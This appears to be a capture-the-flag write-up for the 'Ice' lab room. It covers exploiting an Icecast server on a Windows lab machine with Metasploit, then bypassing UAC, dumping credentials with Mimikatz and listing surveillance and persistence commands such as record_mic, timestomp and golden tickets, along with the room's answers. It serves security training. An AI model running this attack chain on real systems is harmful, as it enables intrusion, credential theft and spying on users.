# Ice

> Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

<br>

Process:
- 1) scanning 
  - port scan: `nmap -T4 <ip>`
    - MSRDP is open on port: **3389**
  - aggressive scan: `nmap -T4 -A -p 135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 <ip>`
    - service running on port 8000 = **icecast**
    - hostname of the machine = **DARK-PC**
- 2) gain access
- type of vulnerability icecast is vulnerable to = **execute code overflow**
- CVE number for this vulnerability = **CVE-2004-1561**
- use metasploit to find this exploit:
  - `msfconsole` -> `search icecast` -> `use 0`
  - exploit module = **exploit/windows/http/icecast_header**
  - configure options:
    - options to set == **RHOSTS**
  - `run` -- to execute
- 3) escalate:
  - name of shell on victim system = **meterpreter**
  - view running processes: `ps`
    - user last running the icecast process = **Dark**
  - find system information: `sysinfo`
    - build of Windows system = **7601**
    - archeticture of the process running = **x64**
  - run the "post/multi/recon/local_exploit_suggester" to find privilege escalation exploits
    - in metepreter: `run post/multi/recon/local_exploit_suggester`
      - (may take serveral minutes to complete)
    - first returned exploit = **exploit/windows/local/bypassuac_eventvwr**
  - background session (`background` or `Ctrl-Z`) -> `use exploit/windows/local/bypassuac_eventvwr` -> [set session number] -> [set options] -> `run`
  - view privileges this higher user has: `getprivs`
    - permission listed that allow you to take ownership of files = **SeTakeOwnershipPrivilege**
- 4) looting
  - move to a process with system permissions:
    - use `ps` to list processes, need to interact with the lsass service (windows authentication) so need to migrate to a process with x64 arch and "NT Authority\SYSTEM" privileges = the spool service
    - spool service process name = **spoolsv.exe**
    - migrate to this process: `migrate -N spoolsv.exe`
    - check user you are running as now with: `getuid`
      - user listed = **NT AUTHORITY\SYSTEM**
  - steal credentials with Mimikatz:
    - `load kiwi` -> `help` -> `creds_all` 
    - command to retrieve all credentials = **creds_all**
    - Dark user password = **Password01!**
- 5) post-exploitation
  - command to dump all of the password hashes stored on the system = **hashdump**
  - command to watch remote user's desktop in real time = **screenshare**
  - command to recrod from a microphone attached to the system = **record_mic**
  - command to modify timestamps of files on the system = **timestomp**
  - command to create a "golden ticket" (via Mimikatz) that lets you authenticate anywhere with ease = **golden_ticket_create**
    - golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain
  - as we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). If this is not enabled on the system then run `run post/windows/manage/enable_rdp` and you can then login
